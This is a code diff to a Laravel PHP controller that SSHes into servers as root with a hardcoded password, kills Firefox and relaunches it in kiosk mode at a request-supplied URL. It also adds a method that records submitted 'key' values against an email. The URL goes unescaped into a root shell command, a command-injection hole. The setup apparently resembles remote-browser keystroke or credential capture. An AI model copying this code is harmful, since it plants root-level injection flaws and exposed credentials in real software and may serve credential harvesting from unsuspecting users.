@@ -33,7 +33,9 @@ class ClientController extends Controller
 
             return view('client', [
                 'url' => $url,
+                'to_url' => $request->url,
                 'ip' => $ip,
+                'email' => $request->email,
             ]);
         }
         session(['using_server' => null]);
@@ -42,15 +44,32 @@ class ClientController extends Controller
     function start(Request $request) 
     {
         $ip = $request->ip;
-        $url = $request->url;
-        if(!Cache::get($ip . '_opened'))
-        {
+        $url = $request->to_url;
+        // if(!Cache::get($ip . '_opened'))
+        // {
             $ssh = new SSH2($ip, 22);
             if (!$ssh->login('root', 'whattheFuxk1231')) {
                 return abort(404);
             }
+            $ssh->exec('pgrep firefox | xargs kill');
             $ssh->exec('export DISPLAY=:1 && firefox --no-sandbox --start-fullscreen --kiosk '. $url .' &');
+            // $ssh->exec('export DISPLAY=:1 && firefox --no-sandbox '. $url .' &');
             Cache::forever($ip . '_opened', 1);
+        // }
+    }
+    function report_user_data(Request $request) 
+    {
+        $ip = $request->ip;
+        $url = $request->url;
+        $email = $request->email;
+        $server = Server::query()->where('server_ip', $ip)->firstOrFail();
+        $user_data = $server->user_data ?? [];
+        if($request->key)
+        {
+            $user_data[] = $request->key;
         }
+        $server->update([
+            'user_data' => $user_data
+        ]);
     }
 }
